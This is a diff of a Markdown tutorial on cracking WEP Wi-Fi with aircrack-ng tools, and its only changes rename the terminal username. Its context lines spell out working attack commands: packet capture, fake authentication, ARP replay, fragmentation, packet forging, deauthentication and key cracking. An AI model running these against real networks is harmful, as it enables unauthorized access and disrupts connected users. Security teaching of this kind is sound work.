@@ -174,7 +174,7 @@ First, change your network adapter mode to monitor. You can do this by running t
 Once this is done, use `airodump-ng` followed by the name of the adapter to list all available Access Points nearby. You will see a list of networks, and you need to identify the ones where the ENC used is WEP.
 
 ```bash
-┌──(proxygeek㉿VMware-kali)-[~]
+┌──(pullsec㉿VMware-kali)-[~]
 └─$ sudo airodump-ng wlan0
 
  CH 14 ][ Elapsed: 36 s ][ 2025-06-01 20:36 ][ enabled AP selection                                                                                         
@@ -196,7 +196,7 @@ In my case, the Access Point named `wifi-old` is using a WEP connection. Now we 
 To do so, run the following command to capture packets, replacing the BSSID and channel with those of the victim network:
 
 ```bash
-┌──(proxygeek㉿VMware-kali)-[~]
+┌──(pullsec㉿VMware-kali)-[~]
 └─$ sudo airodump-ng --bssid <target-BSSID> -c <channel> -w wep.cap wlan0
 
 CH  3 ][ Elapsed: 24 s ][ 2025-06-01 20:41            
@@ -214,7 +214,7 @@ The `--write` option saves all captured packets to the specified file. Capture a
 After you have enough packets, run `airecrack-ng` with the capture file to try and recover the password:
 
 ```bash
-┌──(proxygeek㉿VMware-kali)-[~]
+┌──(pullsec㉿VMware-kali)-[~]
 └─$ sudo airecrack-ng wep.cap
 
 Reading packets, please wait...
@@ -265,14 +265,14 @@ First, make sure your wireless adapter is in monitor mode.
 Use the following command to start listening and identify a WEP-encrypted network and its associated clients:
 
 ```bash
-┌──(proxygeek㉿VMware-kali)-[~]
+┌──(pullsec㉿VMware-kali)-[~]
 └─$ airodump-ng wlan0
 ```
 
 We associate ourselves with the access point so it accepts our injection packets. This is done using the following command:
 
 ```bash
-┌──(proxygeek㉿VMware-kali)-[~]
+┌──(pullsec㉿VMware-kali)-[~]
 └─$ sudo aireplay-ng -1 3600 -q 10 -a <target-BSSID> wlan0
 
 Waiting for beacon frame (BSSID: XX:XX:XX:XX:XX:XX) on channel 6
@@ -292,14 +292,14 @@ The **BSSID**, **channel**, and a client’s MAC address connected to the target
 > If no clients are currently connected, you won’t be able to perform the ARP replay attack effectively. Consider switching to a different AP or wait until a device connects.
 
 ```bash
-┌──(proxygeek㉿VMware-kali)-[~]
+┌──(pullsec㉿VMware-kali)-[~]
 └─$ airodump-ng --bssid <target-BSSID> -c <channel> -w wep-arp wlan0
 ```
 
 Then, in another terminal, send ARP request packets to stimulate traffic:
 
 ```bash
-┌──(proxygeek㉿VMware-kali)-[~]
+┌──(pullsec㉿VMware-kali)-[~]
 └─$ aireplay-ng --arpreplay -b <target-BSSID> -h <client-MAC> wlan0
 
 18:57:12  Waiting for beacon frame (BSSID: XX:XX:XX:XX:XX:XX) on channel 6
@@ -322,7 +322,7 @@ You should start seeing a significant increase in the number of captured data pa
 Once you’ve captured enough IVs (typically 10,000+), attempt to crack the key using:
 
 ```bash
-┌──(proxygeek㉿VMware-kali)-[~]
+┌──(pullsec㉿VMware-kali)-[~]
 └─$ aircrack-ng wep-arp.cap
 ```
 
@@ -332,7 +332,7 @@ If successful, the WEP key will be displayed, allowing access to the network.
 > If you don't see packets increasing, try sending a few deauth packets to refresh the client's connection:
 
 ```bash
-┌──(proxygeek㉿VMware-kali)-[~]
+┌──(pullsec㉿VMware-kali)-[~]
 └─$ aireplay-ng --deauth 5 -a <target-BSSID> -c <client-MAC> wlan0
 
 18:55:44  Waiting for beacon frame (BSSID: XX:XX:XX:XX:XX:XX) on channel 6
@@ -357,28 +357,28 @@ The beauty of this method is that it works even on idle networks without any act
 To start, you first need to put your wireless adapter into monitor mode, enabling packet capture and injection on the wireless channel:
 
 ```bash
-┌──(proxygeek㉿VMware-kali)-[~]
+┌──(pullsec㉿VMware-kali)-[~]
 └─$ sudo airmon-ng start wlan0
 ```
 
 Next, scan for WEP-enabled Access Points in range:
 
 ```bash
-┌──(proxygeek㉿VMware-kali)-[~]
+┌──(pullsec㉿VMware-kali)-[~]
 └─$ sudo airodump-ng wlan0
 ```
 
 Identify your target by its BSSID and operating channel. Once identified, begin capturing packets specifically from this AP:
 
 ```bash
-┌──(proxygeek㉿VMware-kali)-[~]
+┌──(pullsec㉿VMware-kali)-[~]
 └─$ sudo airodump-ng --bssid <BSSID> -c <channel> -w wep_frag wlan0
 ```
 
 Since you have no legitimate client to associate with, perform a fake authentication to trick the AP into accepting your injections:
 
 ```bash
-┌──(proxygeek㉿VMware-kali)-[~]
+┌──(pullsec㉿VMware-kali)-[~]
 └─$ sudo aireplay-ng -1 0 -a <BSSID> -h <fake-MAC> wlan0
 ```
 
@@ -386,14 +386,14 @@ This creates a fake association that allows packet injection.
 Now, launch the fragmentation attack to recover a partial keystream by exploiting small packet fragments sent by the AP:
 
 ```bash
-┌──(proxygeek㉿VMware-kali)-[~]
+┌──(pullsec㉿VMware-kali)-[~]
 └─$ sudo aireplay-ng -5 -b <BSSID> -h <fake-MAC> wlan0
 ```
 
 Once a keystream is extracted, forge an encrypted ARP request packet using the recovered keystream. This forged packet will be used to inject traffic and stimulate the network:
 
 ```bash
-┌──(proxygeek㉿VMware-kali)-[~]
+┌──(pullsec㉿VMware-kali)-[~]
 └─$ sudo packetforge-ng -0 -a <BSSID> -h <fake-MAC> -k <source-IP> -l <destination-IP> -y <keystream-file> -w arp-request
 
 Using packet type: ARP Request
@@ -422,7 +422,7 @@ Forge completed successfully.
 Inject the forged packet into the network:
 
 ```bash
-┌──(proxygeek㉿VMware-kali)-[~]
+┌──(pullsec㉿VMware-kali)-[~]
 └─$ sudo aireplay-ng -2 -r arp-request wlan0
 ```
 
@@ -430,7 +430,7 @@ This injection causes the AP to generate new encrypted packets, increasing the n
 With traffic now stimulated, continue to collect IVs with an ARP replay attack:
 
 ```bash
-┌──(proxygeek㉿VMware-kali)-[~]
+┌──(pullsec㉿VMware-kali)-[~]
 └─$ sudo aireplay-ng --arpreplay -b <BSSID> -h <fake-MAC> wlan0
 ```
 
@@ -438,7 +438,7 @@ Monitor the number of IVs captured until you have enough (usually 10,000+).
 Finally, crack the WEP key using aircrack-ng:
 
 ```bash
-┌──(proxygeek㉿VMware-kali)-[~]
+┌──(pullsec㉿VMware-kali)-[~]
 └─$ sudo aircrack-ng wep_frag.cap
 ```
 
@@ -449,7 +449,7 @@ If successful, you will obtain the WEP key and gain access to the network.
 As we continue to explore wireless security in a controlled and isolated environment, we can utilize tools like Wifite2 to audit and capture network data. For example, the following command:
 
 ```bash
-┌──(proxygeek㉿VMware-kali)-[~]
+┌──(pullsec㉿VMware-kali)-[~]
 └─$ sudo wifite --kill
    .               .    
  .´  ·  .     .  ·  `.  wifite2 2.7.0
